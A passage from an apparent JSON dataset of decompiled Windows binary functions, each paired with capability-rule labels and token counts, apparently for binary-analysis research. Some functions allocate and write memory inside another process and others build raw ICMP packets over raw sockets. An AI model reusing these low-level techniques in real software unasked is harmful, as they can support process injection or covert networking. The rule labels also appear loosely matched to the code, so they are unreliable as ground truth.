*(unaff_EBP + 0xc) = *(unaff_EBP + -0x164);\n                            if (*(unaff_EBP + -0x164) == 0) goto code_r0x2000f4bd;\n                            sub.ntdll.dll_memset(unaff_EBP + -0x98, 0, 0x68);\n                            *(unaff_EBP + -0x80) = *puVar1;\n                            *(unaff_EBP + -0x78) = puVar1[2];\n                            *(unaff_EBP + -0x54) = puVar1[3];\n                            *(unaff_EBP + -100) = 0x1004;\n                            *(unaff_EBP + -0x7c) = puVar1[4];\n                            *(unaff_EBP + -0x60) = 1;\n                            *(unaff_EBP + -0x24) = puVar1 + 6;\n                            pcVar2 = _sym.imp.ntdll.dll_wcslen;\n                            iVar3 = (*_sym.imp.ntdll.dll_wcslen)(puVar1 + 6);\n                            *(unaff_EBP + -0x6c) = iVar3 * 2;\n                            if (iVar3 * 2 < 2) {\n                                *(unaff_EBP + -0x6c) = 2;\n                                **(unaff_EBP + -0x24) = 0;\n                            }\n                            *(unaff_EBP + -0x6a) = *(unaff_EBP + -0x6c) + 2;\n                            iVar3 = (*pcVar2)(puVar1 + 0x88);\n                            *(unaff_EBP + -0x74) = iVar3 * 2;\n                            if (iVar3 * 2 < 2) {\n                                *(unaff_EBP + -0x74) = 2;\n                                **(unaff_EBP + -0x24) = 0;\n                            }\n                            uVar4 = *(unaff_EBP + -0x74) + 2;\n                            *(unaff_EBP + -0x72) = uVar4;\n                            *(unaff_EBP + -0x20) = 0;\n                            *(unaff_EBP + -0x2c) = uVar4 + 0x68 + *(unaff_EBP + -0x6a);\n                            uVar6 = *(unaff_EBP + -0x28);\n                            iVar5 = (*_sym.imp.ntdll.dll_ZwAllocateVirtualMemory)\n                                              (uVar6, unaff_EBP + -0x20, 0, unaff_EBP + -0x2c, 0x3000, 4);\n                            *(unaff_EBP + -0x1c) = iVar5;\n                            if (iVar5 == 0) {\n                                *(unaff_EBP + -0x30) = *(unaff_EBP + -0x20);\n                                iVar5 = *(unaff_EBP + -0x20) + 0x68;\n                                *(unaff_EBP + -0x68) = iVar5;\n                                iVar5 = fcn.2000d909(uVar6, iVar5, 0, *(unaff_EBP + -0x24), *(unaff_EBP + -0x6a));\n                                *(unaff_EBP + -0x1c) = iVar5;\n                                if (iVar5 == 0) {\n                                    iVar5 = *(unaff_EBP + -0x6a) + 0x68 + *(unaff_EBP + -0x20);\n                                    *(unaff_EBP + -0x70) = iVar5;\n                                    iVar5 = fcn.2000d909(uVar6, iVar5, 0, puVar1 + 0x88, *(unaff_EBP + -0x72));\n                                    *(unaff_EBP + -0x1c) = iVar5;\n                                    if (iVar5 == 0) {\n                                        iVar5 = *(unaff_EBP + -0x20);\n                                        *(unaff_EBP + -0x48) = iVar5 + 0x50;\n                                        *(unaff_EBP + -0x44) = iVar5 + 0x50;\n                                        *(unaff_EBP + -0x40) = iVar5 + 0x58;\n                                        *(unaff_EBP + -0x3c) = iVar5 + 0x58;\n                                        *(unaff_EBP + -0x38) = iVar5 + 0x60;\n                                        *(unaff_EBP + -0x34) = iVar5 + 0x60;\n                                        iVar5 = fcn.2000d909(uVar6, iVar5, 0, unaff_EBP + -0x98, 0x68);\n                                        *(unaff_EBP + -0x1c) = iVar5;\n                                        if (iVar5 == 0) {\n                                            fcn.2000e34b();\n                                            fcn.2000e34b();\n                                            uVar6 = *(unaff_EBP + -0x20);\n                                            goto code_r0x2000f8ca;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    *(unaff_EBP + 0xc) = 0;\n                    iVar5 = fcn.2000d8f1(uVar6, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x180, 0x20);\n                    *(unaff_EBP + -0x1c) = iVar5;\n                    if (iVar5 == 0) {\n                        *(unaff_EBP + -0x20) = *(unaff_EBP + -0x168);\n                        if (*(unaff_EBP + -0x168) == 0) {\ncode_r0x2000f4bd:\n                            *(unaff_EBP + -0x1c) = 0xffffffff;\n                        }\n                        else {\n                            sub.ntdll.dll_memset(unaff_EBP + -0x160, 0, 200);\n                            *(unaff_EBP + -0x130) = *puVar1;\n                            *(unaff_EBP + -300) = puVar1[1];\n                            *(unaff_EBP + -0x120) = puVar1[2];\n                            *(unaff_EBP + -0xe0) = puVar1[3];\n                            *(unaff_EBP + -0xf8) = 0x1004;\n                            *(unaff_EBP + -0x128) = puVar1[4];\n                            *(unaff_EBP + -0x124) = puVar1[5];\n                            *(unaff_EBP + -0xf4) = 1;\n                            *(unaff_EBP + -0x24) = puVar1 + 6;\n                            pcVar2 = _sym.imp.ntdll.dll_wcslen;\n                            iVar3 = (*_sym.imp.ntdll.dll_wcslen)(puVar1 + 6);\n                            *(unaff_EBP + -0x108) = iVar3 * 2;\n                            if (iVar3 * 2 < 2) {\n                                *(unaff_EBP + -0x108) = 2;\n                                **(unaff_EBP + -0x24) = 0;\n                            }\n                            *(unaff_EBP + -0x106) = *(unaff_EBP + -0x108) + 2;\n                            iVar3 = (*pcVar2)(puVar1 + 0x88);\n                            *(unaff_EBP + -0x118) = iVar3 * 2;\n                            if (iVar3 * 2 < 2) {\n                                *(unaff_EBP + -0x118) = 2;\n                                **(unaff_EBP + -0x24) = 0;\n                            }\n                            uVar4 = *(unaff_EBP + -0x118) + 2;\n                            *(unaff_EBP + -0x116) = uVar4;\n                            *(unaff_EBP + 0xc) = 0;\n                            *(unaff_EBP + -0x2c) = uVar4 + 200 + *(unaff_EBP + -0x106);\n                            uVar6 = *(unaff_EBP + -0x28);\n                            iVar5 = (*_sym.imp.ntdll.dll_ZwAllocateVirtualMemory)\n                                              (uVar6, unaff_EBP + 0xc, 0, unaff_EBP + -0x2c, 0x3000, 4);\n                            *(unaff_EBP + -0x1c) = iVar5;\n                            if (iVar5 == 0) {\n                                *(unaff_EBP + -0x30) = *(unaff_EBP + 0xc);\n                                iVar5 = *(unaff_EBP + 0xc) + 200;\n                                *(unaff_EBP + -0x100) = iVar5;\n                                *(unaff_EBP + -0xfc) = 0;\n                                iVar5 = fcn.2000d909(uVar6, iVar5, 0, *(unaff_EBP + -0x24), *(unaff_EBP + -0x106));\n                                *(unaff_EBP + -0x1c) = iVar5;\n                                if (iVar5 == 0) {\n                                    iVar5 = *(unaff_EBP + -0x106) + 200 + *(unaff_EBP + 0xc);\n                                    *(unaff_EBP + -0x110) = iVar5;\n                                    *(unaff_EBP + -0x10c) = 0;\n                                    iVar5 = fcn.2000d909(uVar6, iVar5, 0, puVar1 + 0x88, *(unaff_EBP + -0x116));\n                                    *(unaff_EBP + -0x1c) = iVar5;\n                                    if (iVar5 == 0) {\n                                        iVar5 = *(unaff_EBP + 0xc);\n                                        *(unaff_EBP + -200) = iVar5 + 0x98;\n                                        *(unaff_EBP + -0xc4) = 0;\n                                        *(unaff_EBP + -0xc0) = iVar5 + 0x98;\n                                        *(unaff_EBP + -0xbc) = 0;\n                                        *(unaff_EBP + -0xb8) = iVar5 + 0xa8;\n                                        *(unaff_EBP + -0xb4) = 0;\n                                        *(unaff_EBP + -0xb0) = iVar5 + 0xa8;\n                                        *(unaff_EBP + -0xac) = 0;\n                                        *(unaff_EBP + -0xa8) = iVar5 + 0xb8;\n                                        *(unaff_EBP + -0xa4) = 0;\n                                        *(unaff_EBP + -0xa0) = iVar5 + 0xb8;\n                                        *(unaff_EBP + -0x9c) = 0;\n                                        iVar5 = fcn.2000d909(uVar6, iVar5, 0, unaff_EBP + -0x160, 200);\n                                        *(unaff_EBP + -0x1c) = iVar5;\n                                        if (iVar5 == 0) {\n                                            fcn.2000e270(*(unaff_EBP + 0xc));\n                                            fcn.2000e270(*(unaff_EBP + 0xc) + 0x10);\n                                            uVar6 = *(unaff_EBP + 0xc);\ncode_r0x2000f8ca:\n                                            **(unaff_EBP + 0x10) = uVar6;\n                                            *(unaff_EBP + -0x1c) = 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n        }\n    }\n    if ((*(unaff_EBP + -0x1c) != 0) && (*(unaff_EBP + -0x30) != 0)) {\n        *(unaff_EBP + -0x2c) = 0;\n        (*_sym.imp.ntdll.dll_ZwFreeVirtualMemory)(*(unaff_EBP + -0x28), unaff_EBP + -0x30, unaff_EBP + -0x2c, 0x8000);\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x28));\n    }\ncode_r0x2000f91f:\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 3710
    },
    "20016666": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20016666(int32_t arg_8h, uint *arg_ch, uint *arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar4 = arg_8h;\n    var_4h = *(arg_8h + 0xb4);\n    if (var_4h == 0) {\n        if (*(arg_8h + 4) == 0) {\n            iVar1 = arg_8h + 0xf0;\n            fcn.20001567(iVar1);\n            if (*(arg_8h + 0xb4) == 0) {\n                var_4h = 0x21590002;\n                arg_8h = 0;\n                iVar2 = iVar4 + 0xd0;\n                do {\n                    fcn.20001567(iVar2);\n                    if (*(iVar4 + 0xa8) != 0) {\n                        *arg_ch = *(*(iVar4 + 0xa8) + 4);\n                        *arg_10h = *(*(iVar4 + 0xa8) + 8);\n                        piVar3 = *(iVar4 + 0xa8);\n                        *(iVar4 + 0xb0) = *(iVar4 + 0xb0) - piVar3[2];\n                        iVar5 = *piVar3;\n                        (*_sym.imp.msvcrt.dll_free)(piVar3);\n                        *(iVar4 + 0xa8) = iVar5;\n                        if (iVar5 == 0) {\n                            *(iVar4 + 0xac) = 0;\n                        }\n                        fcn.2000157d(iVar2);\n                        var_4h = 0;\n                        break;\n                    }\n                    if (*(iVar4 + 0xb4) != 0) {\n                        var_4h = *(iVar4 + 0xb4);\n                        fcn.2000157d(iVar2);\n                        break;\n                    }\n                    fcn.2000157d(iVar2);\n                    if (arg_14h == 0) break;\n                    iVar5 = fcn.200012d6(iVar4 + 0xe8, 0);\n                    if (iVar5 == 0x102) {\n                        fcn.200012d6(iVar4 + 0xe8, arg_14h);\n                    }\n                    else {\n                        arg_8h = arg_8h + -1;\n                    }\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < 2);\n                fcn.2000157d(iVar1);\n            }\n            else {\n                fcn.2000157d(iVar1);\n                var_4h = *(arg_8h + 0xb4);\n            }\n        }\n        else {\n            var_4h = fcn.20011e58(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 714
    },
    "20017605": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20017605(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    if (arg_ch == 2) {\n        if (arg_14h != 0xc) {\n            return 0x21590001;\n        }\n        sub.ntdll.dll_memcpy(arg_8h + 0x15c, arg_10h, 0xc);\n    }\n    else if (arg_ch == 5) {\n        *(arg_8h + 0x168) = arg_10h;\n    }\n    else {\n        if (arg_ch != 0xb) {\n            return 0x21590001;\n        }\n        *(arg_8h + 0x16c) = arg_10h;\n    }\n    return 0;\n}\n",
        "token_count": 184
    },
    "20017b0b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.20017b0b(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, int32_t *arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    code *pcVar1;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint netlong;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = fcn.200170c6(0);\n    if (var_8h == 0) {\n        sub.ntdll.dll_memset(&netlong, 0, 0xc);\n        pcVar1 = _sym.imp.WS2_32.dll_htonl;\n        var_10h = arg_ch;\n        var_ch._0_1_ = '\\x01';\n        netlong = (*_sym.imp.WS2_32.dll_htonl)(netlong);\n        var_10h = (*pcVar1)(var_10h);\n        sub.ntdll.dll_memset(&var_24h, 0, 0x10);\n        var_20h = &netlong;\n        var_1ch = 0xc;\n        var_24h = arg_10h;\n        var_8h = fcn.200138a1(var_4h, &var_24h, arg_18h, arg_1ch, arg_20h, 0);\n        if (var_8h == 0) {\n            if (0xb < *arg_1ch) {\n                sub.ntdll.dll_memcpy(&netlong, *arg_18h, 0xc);\n                netlong = (*_sym.imp.WS2_32.dll_ntohl)(netlong);\n                var_10h = (*_sym.imp.WS2_32.dll_ntohl)(var_10h);\n                if (var_ch == '\\x02') {\n                    *arg_14h = var_10h;\n                    *arg_1ch = *arg_1ch - 0xc;\n                    if (*arg_1ch < 1) {\n                        fcn.20013299(var_4h, *arg_18h);\n                        *arg_18h = 0;\n                        *arg_1ch = 0;\n                    }\n                    else {\n                        *arg_18h = *arg_18h + 0xc;\n                        *(*arg_18h + -0xc) = var_4h;\n                    }\n                    var_8h = 0;\n                    goto code_r0x20017c17;\n                }\n            }\n            fcn.20013299(var_4h, *arg_18h);\n            *arg_18h = 0;\n            *arg_1ch = 0;\n            var_8h = 0x2159000a;\n        }\n    }\ncode_r0x20017c17:\n    fcn.20017236(var_8h == 0);\n    return var_8h;\n}\n",
        "token_count": 693
    },
    "20018313": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.20018313(uint arg_8h, int32_t arg_ch, int32_t *arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.2001708f(arg_ch);\n    if (var_4h == 0) {\n        return 0x21590006;\n    }\n    iVar1 = fcn.200135e2(var_4h, arg_10h, arg_14h, arg_18h, 0);\n    while( true ) {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*arg_14h < 0xc) break;\n        sub.ntdll.dll_memcpy(&var_10h, *arg_10h, 0xc);\n        var_10h = (*_sym.imp.WS2_32.dll_ntohl)(var_10h);\n        var_ch = (*_sym.imp.WS2_32.dll_ntohl)(var_ch);\n        if (var_8h != '\\x06') {\n            if (var_10h == arg_ch) {\n                if (var_8h == '\\x02') {\n                    iVar1 = fcn.200173d0(arg_ch, *arg_10h, *arg_14h);\n                    if (iVar1 == 0) {\n                        fcn.20013299(var_4h, *arg_10h);\n                    }\n                    *arg_10h = 0;\n                    *arg_14h = 0;\n                    return 0x21590006;\n                }\n                if (var_8h == '\\x03') {\n                    *arg_14h = *arg_14h - 0xc;\n                    if (*arg_14h < 1) {\n                        fcn.20013299(var_4h, *arg_10h);\n                        *arg_10h = 0;\n                        *arg_14h = 0;\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 0xc;\n                        *(*arg_10h + -0xc) = var_4h;\n                    }\n                    return 0;\n                }\n            }\n            break;\n        }\n        fcn.20013299(var_4h, *arg_10h);\n        iVar1 = fcn.200135e2(var_4h, arg_10h, arg_14h, arg_18h, 0);\n    }\n    fcn.20013299(var_4h, *arg_10h);\n    *arg_10h = 0;\n    *arg_14h = 0;\n    fcn.20017cb4(arg_ch, 0);\n    return 0x2159000a;\n}\n",
        "token_count": 650
    },
    "2001843b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.2001843b(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h, uint32_t *arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t *arg_ch_00;\n    uint32_t *arg_10h_00;\n    int32_t iVar2;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = arg_18h;\n    arg_ch_00 = arg_14h;\n    *arg_14h = 0;\n    *arg_18h = 0;\n    iVar2 = fcn.20017419(arg_ch, arg_14h, arg_18h, &arg_14h);\n    if (iVar2 == 0) {\n        arg_14h = fcn.2001708f(arg_ch);\n        if (arg_14h == NULL) {\n            return 0x21590006;\n        }\n        iVar2 = fcn.200135e2(arg_14h, arg_ch_00, arg_10h_00, arg_1ch, 0);\n        if (iVar2 == 0) {\n            do {\n                if (*arg_10h_00 < 0xc) {\ncode_r0x20018510:\n                    iVar2 = 0x2159000a;\n                    goto code_r0x2001856c;\n                }\n                sub.ntdll.dll_memcpy(&var_ch, *arg_ch_00, 0xc);\n                pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n                var_ch = (*_sym.imp.WS2_32.dll_ntohl)(var_ch);\n                var_8h = (*pcVar1)(var_8h);\n                if (var_4h != '\\x06') {\n                    if ((var_4h == '\\x02') && (var_ch == arg_ch)) goto code_r0x2001853d;\n                    if ((var_4h != '\\x03') || (var_ch != arg_ch)) goto code_r0x20018510;\n                }\n                fcn.20013299(arg_14h, *arg_ch_00);\n                iVar2 = fcn.200135e2(arg_14h, arg_ch_00, arg_10h_00, arg_1ch, 0);\n            } while (iVar2 == 0);\n            goto code_r0x20018568;\n        }\n    }\n    else {\n        sub.ntdll.dll_memcpy(&var_ch, *arg_ch_00, 0xc);\n        pcVar1 = _sym.imp.WS2_32.dll_ntohl;\n        var_ch = (*_sym.imp.WS2_32.dll_ntohl)(var_ch);\n        var_8h = (*pcVar1)(var_8h);\ncode_r0x2001853d:\n        *arg_10h = var_8h;\n        *arg_10h_00 = *arg_10h_00 - 0xc;\n        iVar2 = 0;\n        if (*arg_10h_00 < 1) {\n            fcn.20013299(arg_14h, *arg_ch_00);\n            *arg_ch_00 = 0;\n            *arg_10h_00 = 0;\n        }\n        else {\n            *arg_ch_00 = *arg_ch_00 + 0xc;\n            *(*arg_ch_00 + -0xc) = arg_14h;\n        }\ncode_r0x20018568:\n        if (iVar2 == 0) goto code_r0x20018583;\n    }\ncode_r0x2001856c:\n    if (*arg_ch_00 != 0) {\n        fcn.20013299(arg_14h, *arg_ch_00);\n        *arg_ch_00 = 0;\n        *arg_10h_00 = 0;\n    }\ncode_r0x20018583:\n    fcn.20017cb4(arg_ch, iVar2 == 0);\n    return iVar2;\n}\n",
        "token_count": 910
    },
    "20018c9e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20018c9e(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_10h_00;\n    int32_t var_4h;\n    \n    iVar2 = arg_8h;\n    var_4h = 0;\n    iVar1 = arg_8h + 0x144;\n    fcn.20001567(iVar1);\n    arg_10h_00 = arg_8h + 0x3c;\n    arg_8h = 2;\n    do {\n        iVar3 = fcn.20001cfb(arg_10h_00 + 1, fcn.20018707, arg_10h_00);\n        if (iVar3 == 0) {\n            *arg_10h_00 = 1;\n        }\n        else {\n            var_4h = var_4h + 1;\n            *arg_10h_00 = 3;\n        }\n        arg_10h_00 = arg_10h_00 + 6;\n        arg_8h = arg_8h + -1;\n    } while (arg_8h != 0);\n    fcn.2000157d(iVar1);\n    if (var_4h == 2) {\n        uVar4 = 0x21590007;\n    }\n    else {\n        *(iVar2 + 0x30) = arg_ch;\n        *(iVar2 + 0x34) = arg_10h;\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 374
    },
    "200192f4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.200192f4(int32_t *arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_84h;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x98);\n    if (iVar2 == 0) {\n        iVar3 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar2, 0, 0x98);\n        iVar3 = fcn.200234f8(arg_10h, arg_14h, arg_18h & 1, &var_84h, &var_4h);\n        if (iVar3 == 0) {\n            if ((var_84h == 2) || (var_84h == 0x17)) {\n                sub.ntdll.dll_memcpy(iVar2 + 8, &var_84h, 0x80);\n                if (*(iVar2 + 8) == 2) {\n                    iVar3 = (**0x2004700c)();\n                }\n                else {\n                    iVar3 = (**0x2004701c)();\n                }\n                *(iVar2 + 4) = iVar3;\n                if (iVar3 == -1) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                else {\n                    uVar4 = fcn.200018bf();\n                    *(iVar2 + 0x88) = uVar4 & 0x1fffffff | 0x80000000;\n                    *arg_8h = iVar2;\n                    iVar3 = 0;\n                }\n                if (iVar3 == 0) {\n                    return 0;\n                }\n            }\n            else {\n                iVar3 = 0x21590001;\n            }\n        }\n        iVar1 = *(iVar2 + 4);\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n        (*_sym.imp.msvcrt.dll_free)(iVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 516
    },
    "2001992c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001992c(int32_t *arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_84h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x24);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x24);\n        iVar2 = fcn.200234f8(arg_10h, arg_14h, arg_18h & 1, &var_84h, &var_4h);\n        if (iVar2 == 0) {\n            *(iVar1 + 0x20) = var_84h;\n            iVar2 = (*_sym.imp.WS2_32.dll_socket)(var_84h, 3, ((var_84h != 2) - 1 & 0xffffffc7) + 0x3a);\n            *(iVar1 + 0x10) = iVar2;\n            if (iVar2 == -1) {\n                iVar2 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            }\n            else {\n                iVar2 = (*_sym.imp.WS2_32.dll_bind)(iVar2, &var_84h, var_4h);\n                if (iVar2 != -1) {\n                    *(iVar1 + 0x15) = 0;\n                    if (var_84h == 2) {\n                        *(iVar1 + 0x14) = 0;\n                    }\n                    else {\n                        *(iVar1 + 0x14) = 0x81;\n                    }\n                    *arg_8h = iVar1;\n                    return 0;\n                }\n                iVar2 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                (*_sym.imp.WS2_32.dll_closesocket)(*(iVar1 + 0x10));\n            }\n        }\n        (*_sym.imp.msvcrt.dll_free)(iVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 505
    },
    "20019d4e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20019d4e(uint arg_8h, int32_t arg_ch, uint to, uint tolen, uint arg_18h, int32_t arg_1ch)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    ushort uVar3;\n    int32_t in_EAX;\n    uchar *puVar4;\n    int32_t iVar5;\n    uint s;\n    uint var_1ch;\n    int32_t n;\n    uchar *var_10h;\n    uint s2;\n    uchar *buf;\n    int32_t len;\n    \n    buf = NULL;\n    var_10h = NULL;\n    if ((*(in_EAX + 4) == 0) || (arg_1ch != 0)) {\n        sub.ntdll.dll_memset(&s, 0, 0x10);\n    }\n    else {\n        fcn.2002395a(in_EAX + 8, &s);\n    }\n    if (*(in_EAX + 0x20) == 2) {\n        len = n + 8;\n    }\n    else {\n        len = n + 0xc;\n    }\n    len = len + arg_ch;\n    puVar4 = (*_sym.imp.msvcrt.dll_malloc)(len);\n    if (puVar4 == NULL) {\n        return 0x21590004;\n    }\n    if (*(in_EAX + 0x20) == 2) {\n        *puVar4 = *(in_EAX + 0x14);\n        uVar1 = *(in_EAX + 0x15);\n        *(puVar4 + 2) = 0;\n        puVar4[1] = uVar1;\n        buf = puVar4;\n        s2 = (*_sym.imp.WS2_32.dll_htonl)();\n        sub.ntdll.dll_memcpy(puVar4 + 4, &s2, 4);\n        sub.ntdll.dll_memcpy(puVar4 + 8, var_1ch, n);\n        sub.ntdll.dll_memcpy(puVar4 + 8 + n, arg_8h, arg_ch);\n        uVar3 = fcn.200197f4();\n        *(puVar4 + 2) = uVar3;\n        iVar5 = (*_sym.imp.WS2_32.dll_sendto)(*(in_EAX + 0x10), buf, len, 0, to, tolen);\n    }\n    else {\n        puVar4[1] = *(in_EAX + 0x15);\n        *puVar4 = *(in_EAX + 0x14);\n        iVar5 = *0x200467f4;\n        *0x200467f4 = *0x200467f4 + 1;\n        *(puVar4 + 4) = iVar5;\n        *(puVar4 + 2) = 0;\n        var_10h = puVar4;\n        s2 = (*_sym.imp.WS2_32.dll_htonl)(arg_18h);\n        sub.ntdll.dll_memcpy(puVar4 + 8, &s2, 4);\n        sub.ntdll.dll_memcpy(puVar4 + 0xc, var_1ch, n);\n        sub.ntdll.dll_memcpy(puVar4 + 0xc + n, arg_8h, arg_ch);\n        iVar5 = fcn.200198ea();\n        if (iVar5 == 0) {\n            iVar5 = 0x21590001;\n            goto code_r0x20019edd;\n        }\n        iVar5 = (*_sym.imp.WS2_32.dll_sendto)(*(in_EAX + 0x10), var_10h, len, 0, to, tolen);\n    }\n    if (iVar5 == -1) {\n        iVar5 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        if (iVar5 == 0x2738) {\n            iVar5 = 0x2159000b;\n        }\n    }\n    else {\n        iVar5 = 0;\n    }\ncode_r0x20019edd:\n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_1ch);\n    (*pcVar2)(var_10h);\n    (*pcVar2)(buf);\n    return iVar5;\n}\n",
        "token_count": 949
    },
    "2001a1f9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.2001a1f9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x20) == 2) {\n        fcn.20019efc(in_EAX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    else {\n        fcn.2001a075(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "2001a8ff": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
